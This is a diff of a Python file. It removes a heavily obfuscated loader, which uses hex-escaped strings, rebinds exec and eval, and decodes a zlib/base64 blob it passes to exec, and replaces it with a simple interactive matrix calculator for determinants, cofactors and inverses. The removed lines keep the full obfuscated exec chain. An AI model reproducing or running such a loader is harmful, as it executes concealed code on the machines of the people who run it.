@@ -1,3 +1,143 @@
-import random ,base64,codecs,zlib;pyobfuscate=""
-obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(hexlify)'],['''F81in+QMSIp>0HS1A16wBzd^0<BZ4gp_pxH^H%2?+*nkqIgQnoA4mCdww}ryF^o(~AF%Tg_*;*W7$hatPit{w1^>O^(G~yz=>MV@=LMGWD9XYn=jVN|DNMn9y05^bN>HZ*3=fhEJ5E)?nvJBFPPpylCME0$sP=E0K1fZ=Y3etZtNF!^<K<}AA6#D{GS4S2TY0mq$sWST^^|y*wx1gMhW((Yzs#XkpWa(?5jxL@RaICzE7F7t@qL67TVCrGp&jnUjg@LNNsxK?E#kWsHXRQ5suVbktKTh1{hjL33H?*l?kzyt98!ALr0+z$pns=THy!pRCrmKEh*#hfSs30s6|3>#Lv1as(_XCMISTx!H|!r4$dV1o{Y1@&2F{jyV}|AV?JDsB%%)Nd!~_Pel;!Tg%|q?NY+Fkp%!Ar>y(km}8Vky~{8Y)Z>xnzPO>ItiO$-bsS!WgH+Ax#FdnR{p&NL>OIZ~r_;GpJxZ(z?k4qGe?(1~hbcH``Q3kqL7Q^;bFjrxc8YQXy~K!#$U2>In>>n0FJ3ys47$Tg@YvkIl44joaNO~`3WI!dN5R<J_;a^@Q~#CFK-SD9XIrSIltp&srv8<?QuCHXmaC5M<g@Z*Q$&6W~uUSKW5Nj13V_U|RO%VP5sKaYZ%5B`}qB$7oG&+VHa*XlO2ST-Vsp#3cDq<2{+zOxhSJ?L>8g#vZTCJRqBiB8CjlLyvbSWt>-oa5Hi4g}E%>E%vC(?_t=aHG<?hvE%|3Q5w~|F}9W9@32bJadG1Fon~`Z>4lpV0DV9e*cId+vlZ<`mpyy)=viWAA$eq7UcZdb>{uI$QJp(muE=lyk8Ln=1*qtbo&3}XeI+@Pf*qz=;V#UY6iZTC4;cHrd}p06)%R_r?JP-PhKtoTfeeha684xRIdgRqYg%|qWyK%=gf*}V_|3~!@IaP(VKsg?D#=IEo-#T7Tj6{EfK{1qKANQ5;+sS6K_XPPP?JRPV)nk|1cajWowOYhd2VpFiQ&quB~wz&d9IKbZ~pOXF_UkbK?YFDOFLY;p2I0F`jCXoPIEL|1M?p3tpuH^JU1c3R$WxTw+FmDAaUk<h5e4@jn<qTCbPK<Acywnu2~XR`RIz(zajAhFR2&0R;kC&npPA(wM0DJq_F`DqI<rVFD)C!tWFsx6j}hNWveFHU*Q|+XCN)+r^^l$$HIIqXP26-V3&^YDSR@xrC~?Q^ZQ(pPOx_RoOOp37|+R>nBpt8m69*egb_q`FJ~ibNLF``@tNvm<lQ%Ae#J>o;t_nGd_|d%2X+9scJtT2nukrLDm0VNjjaQsPptu*+9+~n|q8l&!D<~oLJ-WC`0Rb^1(!eiQRp@h~ul>Ekpf9c>GcA`g%u4pUy#krJxKH=Vv`T#HG3ld7N|_Rl)rV5($u%x7ZM!m}2Rw8)g<UcjyNS0)*cZfIq8gP+$Lj@;*rE=mzV){Uz(l6F5s8-W(|jHKJXVAS?9;Ps-$EH1}LI<PVk#xlt}hz{_?}X~lHO`^6O@4;l52>SYTqzD(QKRrN<@M)@to*lJb+S4DN~1p=KtB}dr?e9IpzD|T1EkBN7h&NltR(-@CTXi^vN7JR5I+H#$pj)OdK@V#THA*7;rY_VmH4|;n%;!~oC;WOaCE)IQgbo7{vn!&HsI@|ptCc%0m5Eo+p#e(vlfYKkU$_2;az#rX2xWt8t^_3pjnQ>pO$KczFj>h2Cl`%S~z9J*RsWmIthF|QUwKbQ?b{_IPV%xZo&k1?TD^uM>lf4y2ZrJ$rO4i!8)82{%4i5U^wVOg>sZ!UohYb$mezZR}0Vt6xQNS<DoClirl?CEgf7AN_a8$qHc*S}Q7r2Ub7y-)yt6*$^!^G8$UD0i15&^}b6(iNWWEK<XF+4k<S0#NgHIhA==NEIW)<yrhOjhMIEdvMU6ZuL#TH2;rGqsZNoRAfiI2X}-ScK(6$`c)?hOl3F5aln_Z_>9g)hZJ0l|Ao(5I3?pH3Rx64gAqXjltT#1Fk&n{VDKUr{grYiq5qzl>Jv!c+;aT(AQA{k^;|r4+Wgq`{Gl+Jl5oovpKGW5Z~^-%|O-oc<)g$;)L)PzEnXEBG;V1hS`c?H5~J;F5wyIlN%56n$xhP#K^+H?{$Qus@XxZcGpQehUhMc{_Vzc+POl9CNP<8D%1m|w|>Ms>Z;}(A_<dq+JG)pLJ>=b#^U?5^%8)CMBe)8Q#Q$mJaTkJli}`k74PmGEPAxUne@KmmB<tKe$k^wsz>xt0q>yzJ7&ou&6+c{ZKlC%XxhKg4PoW|hlTm5=zfTQ@v)+3DAj1#ufOoJr>?uQm5$_qzE@l#bnpO<td$sEe<Yl5#s#82>|?*ANVJ9Ml37m#&X@V6oMInYauKy8!Q<;m5cSLq;%S>6Hk88SvHOqR)XEF>#ZB+GVw6|o=t{0)LrE#*7*bD|<xz*+g2t!wtCg}KDVcH%7G;J6XV`9QT)(O=5)U)8tcI%1UHx7ai?cMBKcJAEX0%ypUR$zZZ<zmKsgtPtd&a^q1v&L-UCLwg51Xkl#TDkHkRQ$6nMxx$`Z?C*7Ovi)L(SW7@U53Af>Lr$3TVT}8I+D}0-@%&RMMy|9b|2MGQ7&2DvtM9cFto<4pic13W-qeNQfVBG53F%1wMpZZ5Oz1CAM#3$9pYj_pBH?Iu&7c6?K)KF`Y}CY47z$HGt3L!>n}^S3L+;F6~tr;Gl@Yz`z^d>2XhPqN#*HE1kTKzf$$V-(<Pq7$V_0r*D9Y56K~N*^}0FIHkJ*J}uxwcU=LSNeA$QxFYL~#-~S>qZhu2EOZq}-7gYt@gE6*J`u@Y6MZc~Tv5I9wYbIvP?5d?+fsy$#1{P$h^q5#Ci>QPes>7w$f)GI_qCIt8u4XZpTmapNs4{rcolH=)s<KQg-{eLz6?<Zvs5B2>haLC(%2MylT**;d>M&Ef9ROX(+iHhJ~jivzA<P|wJQKmhx8`)$W?^x%v9`Mv{++F)1;?XQkOI`^JMQ7g&~xq{$G^Fi9_{D#>afnw<Ix3Sy+cRNmKfLa4uzt(<gS~a2#YdJwYW+nPFlAH*~;+-2o7ic0J70NfY;VXS;ZR{Ju_<-L?~flJP|A{bGt`f+3Csl?%|salX%gY!RV$wdlkjtin3W^1mW~OczMm#<R`ZM=SupnF;9>^#>`oFFPmkvui86H-JbD^yyEzeyC%s(uMmpfB<z|aWKmaH}G4=hN7+fk$@HB?RJcP1Eg4TFOo}X|NZcG3ky3uK^^>CU9#uK{|35~(T&%+C{6yo2;N-JH^bc8YfZ_VE?(kcz}vWG5eN?$MpXHH>3(R;Mn)o4-lj$ic*Q-6E=O3aU4y~$V7Np%ulq~URlUUH|Ge1fL0~Y_H3?HSW=WC?5y4x`E8mVZyqB+|q4f&>0Xgft?EH;cP|>K<<`MN%rGm~?7>awuDVhYAB{MGPVcLWGv^+L^l?JRRk2Az}=!$BM;MIp(SEr?7#{P?t$5j1$*pYIAvoEi;lnb^ou4;GKyydrcTnCb4UvG_OKA}NhQkBI3&oz|_0@Pgw?>NN@1vf9(OIr(%<qdanAE}XNljdM(D#HDR^@jswJ%m6W4>#wB&LLHO+15zBUcvO&(Ap`<svoF`>~X&{hqMLi_bw8#E%-BIrUE$6Ft_hUXq7cWm3&|xMJ~-M1o=#t#Pe^{p@~+1-CNdCRVg!|+DYl)sQ2#>pQOBEhNZ-}E6ZD)#ZP5P)r5ym+wh21`@e;N5m|(0Z$W=&#H{g?gO$lv>nd<UQa@A$1g0p2pm0o(=mjJ8&>4AyV&!Im0#0U=KQMCX9n=oKuNM2jk1pv0>3GuM2R!Y7%#;JFe0RV*<%6>&iKur=uK)$^)uW@%+0J|9K!AC);@XS(?(YZYnsA2(4TW{A5wAkvfA=sXYN54aq?yo4nYHv=5KU5SnKTd!P(aXflCr;t&^*j!r6>uGu=hVAlc`p{Ro5@=13OY@Q8I=u{l-_Qu44)z$`lmipA8mTw5Siii-t8~e}-1--Yb0O<5_8~(47&gp$%?iO5b2VtuB|Rzu!Cbgu45><{hAkVx#xGh6$#O_<$i|1#l0e14%EdPwJpX$Z9MzRbn5=V=R554GcVDjTZ^pKD2^W83COZz_V=^mg@YFZ-O1vgI0*@;>72G2erFZS^f6V!ADz^BV9IiI>Swb?+3}{2{!M6YSDYava_&+I?W`JG?vWT1xG5VX%R*sZRBtL22i<a@Taodf{Ql1cNPB;mkujyq=$4_cZUN%nC*?;_rMV=Z?FVv;Zvz?xpVGMKcdA7qGd^_u&OifB#@D0RxcWNhj7??v|;10&tE}s-YuGq_A%a=94X$K`NtzALRvv>2)3Nc@$lhRg`Z+HO>@$3Ah<K&tjS|UZF!?!=+~#g9kC6i5}53z3<te@!{*5=J9PjA6Ui0hP>Ve~grRt1<CVnIax{Qvym3P%=zR<{FGb3GIzXGg<NUk^y-<dMChJ*-x&Vyk8nSb=-c|qNjIxuRoRGUz0B3P2E3IHn6ohDdT*z_5Uz?sv4VB>h0DypCijbWEx?z#x)ycQ4quWkEp;saJdx15DP~jI`fPuu0z9N?u`}RM5kI0f~CJu2-T#%7s1}*Q+>R2WU*aL8&J*<A0_5y@Ka(KImQK%2G1(7qTjO0?k*QvG0Cq+gZ{Wz636aJj`TB?y|P-v%-i$dHxKmJL@6TM&uG`Hn*0{|H5oUA`2KeAlPP{}?&@aVoF*ustQ#0rLUW<(3AP7^%F$nDH!-2bwUKy<*-_s2qZcsWicNo7nT<_0Vq;+2PSn}m7TWI@h(d*guKn@@T*{EWd8nhS2NX^3#D*dL%4G>jwv(q@yXjVY=qt(TB7h$7064QxL{FsQ0&m8Z5STrqDh*w&t7)<U07ZIkOEI3f<|jJib1Ur39iIYsU;U;evkvAi2XJ9h!l;kh@;E|Y{YMudj%hvayV9iJa|V$6Z~cP(rkHN>D^st|cgPICVL7QFA!(2N}(*H(Hxv>6grX9+s;OniE`EeyFY>fm+'''.replace('\n','')]))
-_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='600840 10052792 2475510 107811 3460338 725070 743968 2892000 2595808 1123520 4498098 4658724 9505818 3510345 255392 146490 5557929 9774387 9643374 676195 8169140 8968656 7951905 2729216 6994785 2809039 2272480 238206 8998248 10083880 1132512 1887269 9978295 4040976 199290 720029 6381240 390456 4855272 5536608 8270336 5334956 137240 1950112 813888 1000864 14176 4719645 7434130 4414928 6253299 9947928 1058600 1230358 2126544 2411955 8232000 3136064 3545955 10065990 11478610 1845676 5793228 1659528 8606412 2662784 9252354 3826789 8515228 10136529 9876386 4503170 4636636 3050030 2304864 8648920 3476588 1063810 6624464 4304298 1150491 8042410 11245620 2352544 7278969 5070780 3834960 143016 6244008 3168128 11537244 1865133 1213344 1977057 519120 3126900 1538392 2683994 3910416 125890 1943840 169376 2568608 2306112 1493210 846355 4957785 3989836 8217104 10113987 6212658 6166328 5037850 7088140 89080 2665299 9719915 11920920 8955970 163995 576706 283176 3952332 6138720 8659980 10319940 3459800 1280676 161860 51870 2435250 6931656 3196522 1527030 341905 7265895 9809455 5280688 6588183 1684008 10751112 3620735 3711935 2101440 809948 7445910 7656305 6875824 7874685 7469960 4394725 5493528 3843530 1205130 2690707 1967374 2228611 1179175 1150372 171600 701454 4804904 669900 5363840 4755408 11124985 3124634 2961893 2837437 10306240 6771644 3092793 3541328 182988 7504380 2047000 2964060 3378704 8487488 7190998 3697158 1008513 9005208 7376139 3927743 9552368 2742597 5133926 6206652 2311680 3009798 833028 10506608 3530296 4332300 1356850 2624527 2751793 2669733 2394070 3060196 9653172 845520 3047668 1129650 1732414 1747310 6141852 3553786 8646840 10742180 287180 1469024 8047488 11999933 3563346 859220 420224 1719072 288032 236160 8018628 6755070 3157506 9098557 82624 8832714 3347765 2617768 861504 1658215 5273592 2594072 661024 902160 6018871 5059712 9333546 5543478 10761204 2640896 8903453 1575480 7633185 2561625 10578968 1218540 2351744 2321307 6116045 1633408 7015763 5559960 703580 194336 3119584 275968 733760 8284032 10978086 2905647 3348153 823648 7268835 6811105 2865536 6322155 8007685 196784 7085907 1614012 2185672 1955680 2770597 3622466 1278320 2700033 3743630 6963888 713088 5437432 1507305 2370048 8338983 4488036 4277988 9789636 9784072 5294239 4570980 2052020 2932737 873420 692064 2712832 1440256 493184 2269836 5935947 2087019 3347070 9042473 2466925 1163640 715299 5119400 61600 6803360 3070472 3586505 7106652 2033070 3448770 1332254 3203700 10746064 3431176 5216964 6666840 4895988 1158993 1447466 1891930 7078112 6234472 5222771 3231394 5588080 4378418 11000396 10886880 8793728 1153926 5624706 10051328 4147000 877546 3422952 2137083 9117108 160089 559164 5589552 1199496 4719258 5596015 6874390 2490348 1775612 1560720 4793584 715768 4420870 1858864 1768731 6089081 782892 9675759 443322 3954581 1434120 5588080 7513732 9453620 9258872 2909040 2799450 94254 10129700 9949920 11461032 497182 218660 779670 2491648 2679584 494368 352064 4780650 2815914 294496 7500159 7957680 3969000 180320 2806720 695360 4723901 2923730 6454392 9958698 3237507 9151509 4419136 548540 636352 2456512 1158016 760864 1530048 1579104 2585568 430784 2442792 6334013 8462433 5897208 1869828 4518740 3117160 5861968 1116906 2769468 816450 2827072 1415232 1191040 2284736 8500463 5873256 4862550 8653986 474048 4160392 11480880 2319080 5977776 4726700 1302857 2626355 2011353 6087816 4281612 7839 8072324 1344846 941040 376416 1535392 25216 1638144 940672 908128 1618464 2692032 10648056 9403706 9440490 4338990 8526326 10022230 3095680 5052656 1556850 3580776 899200 322624 1953120 70272 295072 4593225 1466046 1091200 6202410 2524200 3669480 7108528 2021742 3980813 775188 2749880 879060 7325537 2466936 3110290 5079795 2893968 18560 2327936 929024 2551104 2492384 250208 2255232 2757472 1236384 1442994 8935815 6523840 4058288 758816 5608275 159264 4936678 7766440 635360 3872280 3241388 98154 46120 2160368 1370625 2638555 1671604 1677458 10174381 1842902 2885703 1477056 2982847 11056675 3048096 4126658 5386576 8473294 255852 9015797 5719266 523215 5380544 7602876 3131200 3952665 5033820 6584982 3005160 3080910 7898256 1513884 2341428 858130 2530240 1594784 2112896 2613536 9160801 10402320 9666407 2264229 3761800 3583302 3224816 6873656 7062880 2358440 1934464 2074850 443128 2641596 11325900 7407946 5716016 5132800 3202520 2705549 2412399 473240 41376 1962080 2383136 2582624 116230 8708018 5645880 6635178 8949913 7043904 9106580 3237618 801350 193792 558464 1907744 2121536 7285534 6910080 4454403 7914654 3865800 9856668 3906900 1701828 590760 464890';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdK8wccz1A+IwYyBt6OheketYHmYKAFuyB3k=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
+#!/usr/bin/env python3
+
+
+class Matrix:
+    def __init__(self, matrix_string) -> None:
+        self.matrix = [
+            [int(num) for num in row.split()] for row in matrix_string.splitlines()
+        ]
+
+    def create(rows, cols) -> list:
+        matrix = [[0 for _ in range(cols)] for _ in range(rows)]
+        return matrix
+
+    def minor(matrix, i, j) -> list:
+        minor = Matrix.create(len(matrix) - 1, len(matrix[0]) - 1)
+        for row in range(len(matrix)):
+            for col in range(len(matrix[0])):
+                if row != i and col != j:
+                    minor_row = row if row < i else row - 1
+                    minor_col = col if col < j else col - 1
+                    minor[minor_row][minor_col] = matrix[row][col]
+        return minor
+
+    def determinant(matrix) -> int:
+        if not Matrix.square(matrix):
+            return None
+
+        size = len(matrix)
+        if size == 1:
+            return matrix[0][0]
+        else:
+            det = 0
+            for j in range(size):
+                det += matrix[0][j] * Matrix.cofactor(matrix, 0, j)
+            return det
+
+    def square(matrix) -> bool:
+        return len(matrix) == len(matrix[0])
+
+    def cofactor(matrix, i, j) -> int:
+        if not Matrix.square(matrix):
+            return None
+
+        sign = 1 if (i + j) % 2 == 0 else -1
+        return sign * Matrix.determinant(Matrix.minor(matrix, i, j))
+
+    def inverse(matrix) -> list:
+        det = Matrix.determinant(matrix)
+        if det == 0:
+            return None
+
+        size = len(matrix)
+        cofactors = Matrix.create(size, size)
+        for i in range(size):
+            for j in range(size):
+                cofactors[i][j] = Matrix.cofactor(matrix, i, j)
+
+        adjoint = Matrix.transpose(cofactors)
+        inverse = Matrix.multiply(adjoint, 1 / det)
+
+        return inverse
+
+    def multiply(matrix, scalar) -> list:
+        return [[value * scalar for value in row] for row in matrix]
+
+    def transpose(matrix) -> list:
+        return [[matrix[j][i] for j in range(len(matrix))] for i in range(len(matrix))]
+
+    def print_matrix(matrix) -> None:
+        for row in matrix:
+            print(" ".join(str(value) for value in row))
+
+
+def get_input_matrices() -> list:
+    matrices = []
+    try:
+        count = int(
+            input("===== Number of matrices =====\n" "Enter number of matrices: ")
+        )
+
+        for i in range(count):
+            print(f"\n===== Matrix {i+1} =====")
+            rows = int(input("Enter number of rows: "))
+            cols = int(input("Enter number of columns: "))
+
+            matrix = Matrix.create(rows, cols)
+
+            print(f"\n===== Enter values for matrix {i+1} =====")
+            for i in range(rows):
+                for j in range(cols):
+                    matrix[i][j] = int(
+                        input(f"Enter value for row {i} and column {j}: ") or 0
+                    )
+            matrices.append(matrix)
+    except ValueError or TypeError or KeyboardInterrupt:
+        print("Invalid input")
+        exit(1)
+
+    return matrices
+
+
+def main() -> None:
+    matrices = get_input_matrices()
+
+    print("\n===== Matrices =====")
+    for i, matrix in enumerate(matrices):
+        print(f"Matrix {i+1}:")
+        Matrix.print_matrix(matrix)
+
+    print("\n===== Square =====")
+    for i, matrix in enumerate(matrices):
+        print(f"Matrix {i+1} is square: {Matrix.square(matrix)}")
+
+    print("\n===== Determinants, Cofactors, and Inverses =====")
+    if not Matrix.square(matrices[0]):
+        print("Cannot calculate determinant, cofactor, and inverse")
+        exit(0)
+
+    print("\n===== Determinants =====")
+    for i, matrix in enumerate(matrices):
+        print(f"Determinant of matrix {i+1}:")
+        print(Matrix.determinant(matrix))
+
+    print("\n===== Cofactors =====")
+    for i, matrix in enumerate(matrices):
+        print(f"Cofactors of matrix {i+1}:")
+        for j in range(len(matrix)):
+            for k in range(len(matrix[0])):
+                print(Matrix.cofactor(matrix, j, k), end=" ")
+            print()
+
+    print("\n===== Inverses =====")
+    for i, matrix in enumerate(matrices):
+        print(f"Inverse of matrix {i+1}:")
+        inverse = Matrix.inverse(matrix)
+        if inverse is None:
+            print("Inverse does not exist")
+        else:
+            Matrix.print_matrix(inverse)
+
+
+if __name__ == "__main__":
+    main()
